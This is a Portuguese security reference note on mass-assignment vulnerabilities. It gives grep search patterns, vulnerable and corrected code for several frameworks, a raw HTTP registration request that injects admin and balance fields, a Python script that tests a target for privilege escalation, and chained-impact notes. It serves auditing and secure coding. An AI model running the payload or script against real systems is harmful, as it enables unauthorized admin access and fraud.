# Mass Assignment

**Tags:** #alto #mass-assignment #orm #privilege-escalation #api
**OWASP:** A03:2021 — Injection / A01:2021 — Broken Access Control
**CVSS Base:** 8.8 (Alto) → 9.8 (Crítico — se permite role=admin)

---

## 📖 O que é

Frameworks com ORM automático atribuem campos de input diretamente ao objeto/model sem filtro. Se o desenvolvedor não usa proteções como `$fillable`/`$guarded` (Laravel), `attr_accessible` (Rails), o atacante pode definir campos protegidos como `role`, `is_admin`, `balance`, `verified`.

---

## 🔍 `grep_search` Táticas

```
fill(
update(request
mass_assignment
@ModelAttribute
bind(req.body
new User(req.body)
User.create(req.body)
User.update(req.body)
Object.assign(user, req.body)
Object.assign(model, body)
$model->fill(
params.require(
permit(
```

---

## 🎯 Frameworks Vulneráveis por Framework

### Laravel / Eloquent (PHP)

```php
// ❌ VULNERÁVEL — fill() sem $fillable
class User extends Model {
    // Sem protected $fillable = [...] → All fields assignable!
}

$user = new User();
$user->fill($request->all());  // atacante envia role=admin
$user->save();
```

```php
// ✅ CORRETO
class User extends Model {
    protected $fillable = ['name', 'email', 'password'];
    protected $guarded = ['role', 'is_admin', 'verified'];
}
```

---

### Express / Node.js

```javascript
// ❌ VULNERÁVEL — Object.assign com req.body completo
app.post('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    Object.assign(user, req.body);  // req.body pode ter {role: "admin"}
    await user.save();
});

// ✅ CORRETO — whitelist explícita de campos permitidos
app.post('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    const { name, email, bio } = req.body;  // Apenas campos permitidos
    Object.assign(user, { name, email, bio });
    await user.save();
});
```

---

### Spring MVC / Java (via `@ModelAttribute`)

```java
// ❌ VULNERÁVEL — @ModelAttribute bind automático
@PostMapping("/update")
public String update(@ModelAttribute User user) {
    userService.save(user);  // todos os campos do form mapeados para User
    return "success";
}
```

```java
// ✅ CORRETO — usar DTO explícito
@PostMapping("/update")
public String update(@ModelAttribute UserUpdateDTO dto) {
    // UserUpdateDTO tem apenas {name, email}
    // role, isAdmin não existem no DTO
    userService.updateFromDto(dto);
    return "success";
}
```

---

### Ruby on Rails

```ruby
# ❌ VULNERÁVEL — Rails 3 (antes de strong parameters)
def update
  @user = User.find(params[:id])
  @user.update_attributes(params[:user])  # qualquer atributo!
end

# ✅ CORRETO — Strong Parameters (Rails 4+)
def update
  @user = User.find(params[:id])
  @user.update(user_params)
end

private

def user_params
  params.require(:user).permit(:name, :email)  # whitelist explícita
end
```

---

## 💣 Exploit de Escalação de Privilégio

```bash
# Registro normal
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "email": "attacker@evil.com",
    "password": "hunter2",
    "name": "Hacker"
}

# Exploit — adicionar campos protegidos
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "email": "attacker@evil.com",
    "password": "hunter2",
    "name": "Hacker",
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "plan": "premium",
    "balance": 99999
}
```

---

## 🧪 Script de Teste

```python
# .tmp/validate_mass_assignment.py
import requests

TARGET = "http://target.com"

# Campos extras para tentar
EXTRA_FIELDS = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "verified": True,
    "plan": "premium",
    "balance": 999999,
    "credit": 999999,
    "subscription": "enterprise",
}

# Registro base legítimo
base_payload = {
    "email": f"test_mass_assign@evil.com",
    "password": "Test1234!",
    "name": "Test User",
}

# Adicionar campos extras ao payload
test_payload = {**base_payload, **EXTRA_FIELDS}

# Registrar
r = requests.post(f"{TARGET}/api/register", json=test_payload, timeout=10)
print(f"Register: {r.status_code}")
print(f"Response: {r.text[:300]}")

# Tentar logar e verificar role
if r.status_code in [200, 201]:
    login_r = requests.post(f"{TARGET}/api/login", json={
        "email": base_payload["email"],
        "password": base_payload["password"]
    }, timeout=10)
    print(f"\nLogin: {login_r.status_code}")
    print(f"Token/Session: {login_r.text[:300]}")
    
    # Verificar se o role foi aceito
    token = login_r.json().get('token', '')
    if token:
        profile_r = requests.get(f"{TARGET}/api/profile", 
                                  headers={"Authorization": f"Bearer {token}"})
        print(f"\nProfile: {profile_r.text[:300]}")
        if "admin" in profile_r.text.lower():
            print("\n[VULN CRÍTICO] Mass Assignment confirmado — role=admin aceito!")
```

---

## 🛡️ Correção — Princípio Geral

**Whitelist explícita** sempre. Nunca confiar no modelo de blacklist.

```python
# ✅ Django — exclude campos sensíveis do Form
class UserUpdateForm(forms.ModelForm):
    class Meta:
        model = User
        fields = ['first_name', 'last_name', 'email']
        # 'role', 'is_staff', 'is_superuser' não estão na whitelist
```

```python
# ✅ Flask-SQLAlchemy — nunca atualizar com dict completo
@app.put('/users/<int:user_id>')
@login_required
def update_user(user_id):
    data = request.json
    user = User.query.get_or_404(user_id)
    
    # Extrair explicitamente apenas campos permitidos
    allowed_fields = {'name', 'email', 'bio', 'avatar_url'}
    for field in allowed_fields:
        if field in data:
            setattr(user, field, data[field])
    
    # NUNCA: for field, value in data.items(): setattr(user, field, value)
    
    db.session.commit()
```

---

## 🔗 Chain Exploits

```
Mass Assignment + role=admin → Acesso admin completo sem privilégio
Mass Assignment + verified=true → Bypass de verificação de email
Mass Assignment + balance=9999 → Fraude financeira imediata
Mass Assignment + is_staff=true (Django) → Acesso ao Django Admin
Mass Assignment + plan=enterprise → Acesso gratuito a funcionalidades pagas
```

---

## 📌 Referências
- [[Business Logic Flaws]]
- [[IDOR & BOLA — Broken Object Level Authorization]]
- [[Autenticação & Gestão de Sessão]]
- [OWASP Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
